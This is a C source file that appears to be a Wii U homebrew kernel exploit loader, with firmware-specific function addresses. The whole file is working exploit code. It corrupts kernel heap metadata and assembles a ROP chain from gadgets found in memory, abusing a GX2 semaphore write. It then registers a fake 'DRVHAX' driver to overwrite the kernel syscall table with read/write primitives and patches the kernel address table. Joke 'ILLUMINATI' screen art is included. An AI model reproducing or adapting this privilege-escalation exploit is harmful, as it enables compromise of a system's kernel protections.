#include "loader.h"

#if VER == 532
#define __PPCExit ((void (*)(void))0x0101C570)
#define _Exit ((void (*)(void))0x0101CD70)
#define OSAllocFromSystem ((void* (*)(uint32_t size, int align))0x01021F0C)
#define OSFreeToSystem ((void (*)(void *ptr))0x01021FA0)
#define DCFlushRange ((void (*)(void *buffer, uint32_t length))0x01023EE8)
#define OSSleepTicks ((void (*)(uint32_t ticks))0x01041FF4)

#define IM_Open ((uint32_t (*)(void))0x010817A8)
#define IM_SetDeviceState ((void (*)(uint32_t fd, void *mem, int state, int a, int b))0x01081B50)
#define IM_Close ((void (*)(uint32_t fd))0x010817B8)

#define Register ((void (*)(char *driver_name, uint32_t name_length, void *buf1, void *buf2))0x01027758)
#define CopyToSaveArea ((void (*)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length))0x0102777C)

#define OSCreateThread ((bool (*)(void *thread, void *entry, int argc, void *args, uint32_t *stack, uint32_t stack_size, int priority, uint16_t attr))0x010414C8)
#define OSResumeThread ((int (*)(void *thread))0x010419B0)
#define OSExitThread ((void (*)(void))0x01041614)

#define OSScreenInit ((void (*)(void))0x0103A880)
#define OSScreenSetBufferEx ((void (*)(uint32_t buffer_num, void *addr))0x0103A934)
#define OSScreenFlipBuffersEx ((void (*)(uint32_t buffer_num))0x0103A9D0)
#define OSScreenGetBufferSizeEx ((uint32_t (*)(uint32_t buffer_num))0x0103A91C)
#define OSScreenClearBufferEx ((void (*)(uint32_t buffer_num, uint32_t color))0x0103AA90)
#define OSScreenPutFontEx ((void (*)(int bufferNum, uint32_t posX, uint32_t posY, const char *str))0x0103AF14)
#elif VER == 550
#define __PPCExit ((void (*)(void))0x0101C580)
#define _Exit ((void (*)(void))0x0101CD80)
#define OSAllocFromSystem ((void* (*)(uint32_t size, int align))0x01021FA8)
#define OSFreeToSystem ((void (*)(void *ptr))0x0102203C)
#define DCFlushRange ((void (*)(void *buffer, uint32_t length))0x01023F88)
#define OSSleepTicks ((void (*)(uint32_t ticks))0x0104274C)

#define IM_Open ((uint32_t (*)(void))0x010821F0)
#define IM_SetDeviceState ((void (*)(uint32_t fd, void *mem, int state, int a, int b))0x01082598)
#define IM_Close ((void (*)(uint32_t fd))0x01082200)

#define Register ((void (*)(char *driver_name, uint32_t name_length, void *buf1, void *buf2))0x010277B8)
#define CopyToSaveArea ((void (*)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length))0x010277DC)

#define OSCreateThread ((bool (*)(void *thread, void *entry, int argc, void *args, uint32_t *stack, uint32_t stack_size, int priority, uint16_t attr))0x01041B64)
#define OSResumeThread ((int (*)(void *thread))0x01042108)
#define OSExitThread ((void (*)(void))0x01041D6C)

#define OSScreenInit ((void (*)(void))0x0103AE80)
#define OSScreenSetBufferEx ((void (*)(uint32_t buffer_num, void *addr))0x0103AF34)
#define OSScreenFlipBuffersEx ((void (*)(uint32_t buffer_num))0x0103AFD0)
#define OSScreenGetBufferSizeEx ((uint32_t (*)(uint32_t buffer_num))0x0103AF1C)
#define OSScreenClearBufferEx ((void (*)(uint32_t buffer_num, uint32_t color))0x0103B090)
#define OSScreenPutFontEx ((void (*)(int bufferNum, uint32_t posX, uint32_t posY, const char *str))0x0103B514)
#endif

void* memset(uint8_t *dst, const uint8_t val, uint32_t size);
void fill_screen(uint8_t r, uint8_t g, uint8_t b, uint8_t a);
void flip_buffers(void);
void sleep(uint32_t seconds);
void illuminati(void);

void _start()
{
	/* Load a good stack */
	asm(
		"lis %r1, 0x1AF0 ;"
		"ori %r1, %r1, 0xFFF0 ;"
	);

	/* Get a handle to coreinit.rpl and gx2.rpl */
	unsigned int coreinit_handle, gx2_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
	
	/* Restart system to get lib access */
	uint32_t fd = IM_Open();
	uint8_t *mem = OSAllocFromSystem(0x100, 64);
	memset(mem, 0, 0x100);

	/* set restart flag to force quit browser */
	IM_SetDeviceState(fd, mem, 3, 0, 0);
	IM_Close(fd);
	OSFreeToSystem(mem);

	sleep(1);
	
	//Call the Screen initilzation function.
	OSScreenInit();
	//Grab the buffer size for each screen (TV and gamepad)
	int buf0_size = OSScreenGetBufferSizeEx(0);
	int buf1_size = OSScreenGetBufferSizeEx(1);
	//Set the buffer area.
	OSScreenSetBufferEx(0, (void *)0xF4000000);
	OSScreenSetBufferEx(1, (void *)0xF4000000 + buf0_size);
	//Clear both framebuffers.
	for (uint32_t ii = 0; ii < 2; ii++)
	{
		fill_screen(115, 159, 96, 0);
		flip_buffers();
	}
	
	illuminati();
	OSScreenPutFontEx(0, 0, 8, "CONFIRMING ILLUMINATI...");
	OSScreenPutFontEx(1, 0, 7, "CONFIRMING ILLUMINATI...");
	flip_buffers();
	sleep(1);
	
	illuminati();
	OSScreenPutFontEx(0, 0, 8, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(1, 0, 7, "CONFIRMING ILLUMINATI...OK");
	flip_buffers();
	
	illuminati();
	OSScreenPutFontEx(0, 0, 8, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(1, 0, 7, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(0, 0, 9, "IOSU 1337 H4X...........");
	OSScreenPutFontEx(1, 0, 8, "IOSU 1337 H4X...........");
	flip_buffers();
	
	OSDynLoad_Acquire("gx2.rpl", &gx2_handle);
	
	/* Memory functions */
	void (*DCInvalidateRange)(void *buffer, uint32_t length);
	void (*DCTouchRange)(void *buffer, uint32_t length);
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCTouchRange", &DCTouchRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);

	/* GX2 functions */
	void (*GX2SetSemaphore)(uint64_t *sem, int action);
	void (*GX2Flush)(void);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2SetSemaphore", &GX2SetSemaphore);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2Flush", &GX2Flush);

	/* Allocate space for DRVHAX */
	uint32_t *drvhax = OSAllocFromSystem(0x4C, 4);

	/* Set the kernel heap metadata entry */
	uint32_t *metadata = (uint32_t*) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
	metadata[0] = (uint32_t)drvhax;
	metadata[1] = (uint32_t)-0x4C;
	metadata[2] = (uint32_t)-1;
	metadata[3] = (uint32_t)-1;
	
	/* Find some gadgets */
	uint32_t gx2data[] = {0xfc2a0000};
	uint32_t gx2data_addr = (uint32_t) find_gadget(gx2data, 0x04, 0x10000000);
	uint32_t r3r4load[] = {0x80610008, 0x8081000C, 0x80010014, 0x7C0803A6, 0x38210010, 0x4E800020};
	uint32_t r3r4load_addr = (uint32_t) find_gadget(r3r4load, 0x18, 0x01000000);
	uint32_t r30r31load[] = {0x80010014, 0x83e1000c, 0x7c0803a6, 0x83c10008, 0x38210010, 0x4e800020};
	uint32_t r30r31load_addr = (uint32_t) find_gadget(r30r31load, 0x18, 0x01000000);
	uint32_t doflush[] = {0xba810008, 0x8001003c, 0x7c0803a6, 0x38210038, 0x4e800020, 0x9421ffe0, 0xbf61000c, 0x7c0802a6, 0x7c7e1b78, 0x7c9f2378, 0x90010024};
	uint32_t doflush_addr = (uint32_t) find_gadget(doflush, 0x2C, 0x01000000) + 0x14 + 0x18;
	
	/* Modify a next ptr on the heap */
	uint32_t kpaddr = KERN_HEAP_PHYS + STARTID_OFFSET;

	/* Make a thread to modify the semaphore */
	OSContext *thread = (OSContext*)OSAllocFromSystem(0x1000,8);
	uint32_t *stack = (uint32_t*)OSAllocFromSystem(0xA0,0x20);
	if (!OSCreateThread(thread, (void*)0x11A1DD8, 0, NULL, stack + 0x28, 0xA0, 0, 0x1 | 0x8)) OSFatal("Failed to create thread");

	/* Set up the ROP chain */
	thread->gpr[1] = (uint32_t)stack;
	thread->gpr[3] = kpaddr;
	thread->gpr[30] = gx2data_addr;
	thread->gpr[31] = 1;
	thread->srr0 = ((uint32_t)GX2SetSemaphore) + 0x2C;

	stack[0x24/4] = r30r31load_addr;					/* Load r30/r31 - stack=0x20 */
	stack[0x28/4] = gx2data_addr;						/* r30 = GX2 data area */
	stack[0x2c/4] = 1;									/* r31 = 1 (signal) */

	stack[0x34/4] = r3r4load_addr;						/* Load r3/r4 - stack=0x30 */
	stack[0x38/4] = kpaddr;

	stack[0x44/4] = ((uint32_t)GX2SetSemaphore) + 0x2C;	/* GX2SetSemaphore() - stack=0x40 */

	stack[0x64/4] = r30r31load_addr;					/* Load r30/r31 - stack=0x60 */
	stack[0x68/4] = 0x100;								/* r30 = r3 of do_flush = 0x100 */
	stack[0x6c/4] = 1;									/* r31 = r4 of do_flush = 1 */

	stack[0x74/4] = doflush_addr;						/* do_flush() - stack=0x70 */

	stack[0x94/4] = (uint32_t)OSExitThread;

	/* Start the thread */
	OSResumeThread(thread);

	/* Wait for a while */
	sleep(1);
	

	/* Free stuff */
	OSFreeToSystem(thread);
	OSFreeToSystem(stack);
	
	/* Register a new OSDriver, DRVHAX */
	char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
	Register(drvname, 6, NULL, NULL);

	/* Modify its save area to point to the kernel syscall table */
	drvhax[0x44/4] = KERN_SYSCALL_TBL + (0x34 * 4);

	/* Use DRVHAX to install the read and write syscalls */
	uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};
	CopyToSaveArea(drvname, 6, syscalls, 8);
	
	illuminati();
	OSScreenPutFontEx(0, 0, 8, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(1, 0, 7, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(0, 0, 9, "IOSU 1337 H4X...........OK");
	OSScreenPutFontEx(1, 0, 8, "IOSU 1337 H4X...........OK");
	flip_buffers();
	
	/* Clean up the heap and driver list so we can exit */
	kern_write((void*)KERN_HEAP + STARTID_OFFSET, 0);
	kern_write((void*)KERN_DRVPTR, drvhax[0x48/4]);

	/* Modify the kernel address table and exit */
	kern_write((void*)KERN_ADDRESS_TBL + (0x12 * 4), 0x31000000); //Map 0xA0000000 to 0x31000000, loadiine needs 0x10000000
	kern_write((void*)KERN_ADDRESS_TBL + (0x13 * 4), 0x28305800);
	
	illuminati();
	OSScreenPutFontEx(0, 0, 8, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(1, 0, 7, "CONFIRMING ILLUMINATI...OK");
	OSScreenPutFontEx(0, 0, 9, "IOSU 1337 H4X...........OK");
	OSScreenPutFontEx(1, 0, 8, "IOSU 1337 H4X...........OK");
	OSScreenPutFontEx(0, 0, 10, "Exiting...");
	OSScreenPutFontEx(1, 0, 9, "Exiting...");
	flip_buffers();
	sleep(1);
	
	for(uint32_t ii = 0;ii < 2;ii++)
	{
		fill_screen(0,0,0,0);
		flip_buffers();
	}
	_Exit();

	while(1);
}

/* Simple memcmp() implementation */
int memcmp(uint8_t *ptr1, uint8_t *ptr2, uint32_t length)
{
	for (uint32_t i = 0; i < length; i++)
		if (ptr1[i] != ptr2[i]) return 1;
	return 0;
}

void* memcpy(uint8_t *dst, const uint8_t *src, uint32_t size)
{
	for (uint32_t i = 0; i < size; i++)
		dst[i] = src[i];
	return dst;
}

/* for internal and gcc usage */
void* memset(uint8_t *dst, const uint8_t val, uint32_t size)
{
	for (uint32_t i = 0; i < size; i++)
		dst[i] = val;
	return dst;
}

/* Find a gadget based on a sequence of words */
void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
{
	uint32_t *ptr;
	/* Search code before JIT area first */
	for (ptr = (uint32_t*)gadgets_start; ptr != (uint32_t*)JIT_ADDRESS; ptr++)
		if (!memcmp((uint8_t*)ptr, (uint8_t*)&code[0], length)) return ptr;

	/* Restart search after JIT */
	for (ptr = (uint32_t*)CODE_ADDRESS_START; ptr != (uint32_t*)CODE_ADDRESS_END; ptr++)
		if (!memcmp((uint8_t*)ptr, (uint8_t*)&code[0], length)) return ptr;
	_Exit();
	return NULL;
}

/* Chadderz's kernel read function */
uint32_t kern_read(const void *addr)
{
	uint32_t result;
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"li 5,0\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%1\n"
		"li 0,0x3400\n"
		"mr %0,1\n"
		"sc\n"
		"nop\n"
		"mr 1,%0\n"
		"mr %0,3\n"
		:	"=r"(result)
		:	"b"(addr)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
	);

	return result;
}

/* Chadderz's kernel write function */
void kern_write(void *addr, uint32_t value)
{
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"mr 5,%1\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%0\n"
		"mr %1,1\n"
		"li 0,0x3500\n"
		"sc\n"
		"nop\n"
		"mr 1,%1\n"
		:
		:	"r"(addr), "r"(value)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
		);
}

void flip_buffers(void)
{
	//Grab the buffer size for each screen (TV and gamepad)
	int tv_size = OSScreenGetBufferSizeEx(0);
	int drc_size = OSScreenGetBufferSizeEx(1);
	DCFlushRange((void *)0xF4000000, tv_size);
	DCFlushRange((void *)0xF4000000+tv_size, drc_size);
	OSScreenFlipBuffersEx(0);
	OSScreenFlipBuffersEx(1);
}

void fill_screen(uint8_t r, uint8_t g, uint8_t b, uint8_t a)
{
	uint32_t num = (r << 24) | (g << 16) | (b << 8) | a;
	OSScreenClearBufferEx(0, num);
	OSScreenClearBufferEx(1, num);
}

void sleep(uint32_t seconds)
{
	//busClockSpeed * seconds is rough estimate of a second instruction-wise
	uint32_t ticks = seconds * (248625000);
	while(ticks--) ;
}

void illuminati(void)
{
	OSScreenPutFontEx(0, 0, 0, "\t\t\t\t      `-.    -./\\.-    .-' ");
	OSScreenPutFontEx(0, 0, 1, "\t\t\t\t          -.  /_|\\  .-");
	OSScreenPutFontEx(0, 0, 2, "\t\t\t\t      `-.   `/____\\'   .-'.");
	OSScreenPutFontEx(0, 0, 3, "\t\t\t\t   `-.    -./.-''-.\\.-      '");
	OSScreenPutFontEx(0, 0, 4, "\t\t\t\t      `-.  /< (()) >\\  .-'");
	OSScreenPutFontEx(0, 0, 5, "\t\t\t\t    -   .`/__`-..-'__\\'   .-");
	OSScreenPutFontEx(0, 0, 6, "\t\t\t\t  ,...`-./___|____|___\\.-'.,.");
	OSScreenPutFontEx(1, 0, 0, "\t\t\t      /\\ ");
    OSScreenPutFontEx(1, 0, 1, "\t\t\t     /  \\ ");
    OSScreenPutFontEx(1, 0, 2, "\t\t\t    /,--.\\ ");
    OSScreenPutFontEx(1, 0, 3, "\t\t\t   /< () >\\ ");
	OSScreenPutFontEx(1, 0, 4, "\t\t\t  /  `--'  \\ ");
	OSScreenPutFontEx(1, 0, 5, "\t\t\t /__________\\ ");
	OSScreenPutFontEx(1, 0, 20, "ILLUMINATI"); //BIN2MP4 doesn't like text so I do this so-
	//It doesn't display garbage
}